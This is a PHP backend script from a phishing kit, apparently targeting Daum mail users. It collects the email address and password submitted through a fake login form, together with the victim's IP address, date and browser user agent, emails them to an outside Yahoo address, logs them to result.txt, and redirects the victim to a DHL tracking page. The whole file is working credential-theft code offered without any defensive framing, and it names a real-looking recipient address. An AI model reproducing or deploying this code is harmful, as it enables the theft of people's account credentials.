<?php

$data .=''."\n";
$data .='Login No='.""; $data .=rand(10,10000)."\n";
$data .='Email='.""; $data .=$_POST['Email']."\n";
$data .='password='.""; $data .=$_POST['Passwd']."\n";
$data .='IP='.""; $data .=$_SERVER["REMOTE_ADDR"]."\n";
$data .='Date='.""; $data .=date("m/d/y G.i:s", time())."\n";
$data .='User Agent='.""; $data .=$_SERVER['HTTP_USER_AGENT']."\n";
$data .=''."\n";
$data .='------=====HACKED BY SLYUGOS========--------'."\n";

$file .="result.txt";

$to="austine.uzor@yahoo.com";
$subject= "Daum Logins";
$headers = "austine.uzor@yahoo.com";
mail($to,$subject,$data,$headers);

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $data) or die("Couldn't write values to file!");
fclose($fp);

				$msg= header ("Location: https://track.dhlparcel.co.uk/?url=https%3A%2F%2Fmail.daum.net%2F");
?>